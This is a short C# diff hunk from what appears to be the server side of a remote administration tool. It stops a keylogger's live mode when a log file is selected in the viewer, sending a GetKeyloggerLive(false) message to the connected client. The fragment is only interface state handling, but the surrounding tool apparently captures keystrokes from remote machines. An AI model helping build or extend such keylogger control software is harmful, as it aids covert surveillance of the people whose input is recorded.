@@ -81,6 +81,15 @@ namespace xServer.Forms
             if (lstLogs.SelectedItems.Count > 0)
             {
                 wLogViewer.Navigate(Path.Combine(_path, lstLogs.SelectedItems[0].Text));
+
+                if (_liveModeEnabled)
+                {
+                    btnLiveMode.Text = "Start Live Mode";
+
+                    this._connectClient.Send(new GetKeyloggerLive(false));
+
+                    _liveModeEnabled = false;
+                }
             }
         }
 
